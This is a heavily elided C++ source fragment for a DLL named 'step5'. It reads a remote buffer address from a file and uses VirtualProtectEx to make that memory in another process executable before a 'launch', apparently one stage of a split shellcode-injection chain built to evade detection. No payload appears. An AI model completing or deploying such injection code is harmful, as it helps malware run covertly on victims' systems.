...
// cl.exe /D_USRDLL /D_WINDLL /MT /TP step5.cpp /link /DLL /out:step5.dll /SUBSYSTEM:CONSOLE /MACHINE:x64
                     ...
                     )
{
	...
	{	
		log_msg("Cannot open the remote buffer address file split.buff_addr (step5). Exiting.\n");
		if(verbose_output) CloseHandle(log_file);	
		return FALSE;
	}		
	QWORD ptrAsInt = 0;
	...
	snprintf(msg,sizeof(msg),"Remote buffer address read from the ptr file (step5): %p\n",remoteBuffer);
	log_msg(msg);			
	...
	DWORD oldProtect;
	if (!VirtualProtectEx(hProcess, remoteBuffer,  BUFFER_SIZE, PAGE_EXECUTE_READ, &oldProtect)) {	
		log_msg("Failed to make the page section executable.\n");
		return FALSE;
	}
	CloseHandle(hProcess);
	snprintf(msg,sizeof(msg),"Memory at %p made executable, we're ready to launch (step5)!\n",remoteBuffer);
	log_msg(msg);
	return TRUE;
}
